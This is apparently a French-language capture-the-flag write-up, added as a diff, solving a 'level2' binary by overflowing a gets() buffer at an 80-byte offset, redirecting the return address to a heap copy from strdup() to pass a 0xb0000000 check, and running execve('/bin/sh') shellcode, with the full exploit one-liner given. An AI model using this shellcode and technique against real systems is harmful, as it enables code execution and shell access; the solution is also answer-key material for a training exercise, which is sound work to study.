@@ -1,0 +1,66 @@
+Disas main
+On voit qu'il n'y a juste qu'un appel a la fonction p()
+
+Disas p
+Dans p on voit encore un gets() et donc un buffer, on retente d'ecraser la valeur de retour.
+Pour ca il faut trouver l'offset, on copie :
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY
+Il segfault a 0x55, donc la lettre U. Il y'a 20 lettres avant le U, donc 4x20 = 80.
+L'offset est de 80.
+
+Maintenant qu'on a l'offset on peut ecraser la valeur de RET, mais pour la remplacer par quoi?
+On voit que le programme verifie si l'adresse de retour est similaire a 0xb0000000 le programme fait un printf et quitte.
+il faut donc contourner cette comparaison en utilisant une adresse qui ne commence pas par 0xb.
+
+On voit ensuite que le programme appelle strdup()
+cette fonction fait une copie de notre entree sur la heap.
+dans gdb si on place un breakpoint apres le strdup :
+
+break *0x0804853d puis un step
+On peut regarder la valeur de retour :
+p/x $eax
+On obtient :
+0x0804a008
+Cette adresse appartient a la heap, et elle ne commence pas par 0xb
+Donc elle ne declenche pas la verification.
+
+On verifie si la heap peut etre execute :
+
+checksec --file ./level2
+No canary found NX disabled No PIE
+Le NX etant desactive on peut execute la heap.
+
+On peut donc mettre notre shellcodecode dans l'argument, mettre le padding, et ensuite ecraser l'adresse avec l'adresse de la heap.
+
+L'adresse doit être écrite en little-endian :
+    0x0804a008 -> \x08\xa0\x04\x08
+
+Avec Python 2.7.3 :
+    import sys
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+shellcode :
+    Construire la chaîne "/bin//sh" en memoire
+    Preparer les arguments pour execve()
+    Mettre le numero du syscall execve dans EAX
+    Faire int 0x80 pour demander au noyau d'executer execve()
+
+le shellcode permet donc de faire l'equivalent de :
+execve("/bin/sh", NULL, NULL);
+
+Solution :
+
+python -c 'import sys; shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"; sys.stdout.write(shellcode + "A"*(80-len(shellcode)) + "\x08\xa0\x04\x08")' > /tmp/test
+cat /tmp/test - | ./level2
+
+
+
+
+
+NOTES -----------------------------------------------
+
+offset RET = 80
+adresse heap controlee = 0x0804a008
+heap executable (NX disabled)
+adresses du binaire fixes (No PIE)
+RET 0x0804a008 passe le filtre 0xb0000000
